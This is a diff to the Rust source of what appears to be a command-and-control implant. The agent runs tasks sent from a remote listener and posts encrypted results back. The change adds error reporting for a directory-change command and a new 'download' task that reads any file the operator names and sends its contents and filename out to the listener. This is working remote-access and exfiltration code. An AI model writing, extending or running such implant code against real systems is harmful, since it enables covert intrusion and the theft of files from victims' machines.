@@ -2,7 +2,7 @@ use reqwest::header::{HeaderMap, USER_AGENT};
 use std::{
     collections::HashMap,
     fs::File,
-    io::{self, Error, ErrorKind, Write},
+    io::{self, Error, ErrorKind, Read, Write},
     thread,
     time,
     process::Command
@@ -183,6 +183,38 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     Ok(_) => {
                         post_task_result(
                             "The current directory changed successfully.".as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                }
+            }
+            "download" => {
+                match std::fs::File::open(task_args[1].as_str()) {
+                    Ok(ref mut f) => {
+                        let mut buf = Vec::new();
+                        f.read_to_end(&mut buf).unwrap();
+                        // Insert the filename at the top position for sending it along with the contents.
+                        let f_name = task_args[1].to_string() + "\n";
+                        let final_buf = [f_name.as_bytes(), &buf].concat();
+
+                        post_task_result(
+                            &final_buf,
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
